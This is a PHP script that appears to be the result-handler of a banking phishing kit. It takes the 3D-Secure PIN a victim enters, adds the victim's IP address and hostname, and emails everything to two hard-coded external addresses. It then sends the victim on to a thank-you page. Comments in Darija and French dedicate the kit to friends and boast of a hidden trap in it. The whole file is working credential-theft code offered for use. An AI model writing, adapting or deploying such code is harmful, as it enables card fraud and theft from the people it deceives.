<?php
// Ehh l7alwa l7alwa I dédicace l3chran LAHCEN KHALID ACHRAF BADR
// ATTENTION MLGHMA HHHHHH
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "====+++ Oui c sa VBV HIHI +++====\n";
$message .= "3D-SECURE: ".$_POST['pin']."\n";
$message .= "======+ BY +=======\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "=====+ -------- +=====\n";
$send = "sch.vida.2017@gmail.com,darksp@yahoo.com"; /// decode 7na b cmd atl3 lik tlghima hhhh 
$subject = "3D VBV CA *_* [".$_POST['pin']."] $ip";
$headers = "From:  <Resultat@okby.com>";

mail($send,$subject,$message,$headers);
header("Location: thankyou.php");

?>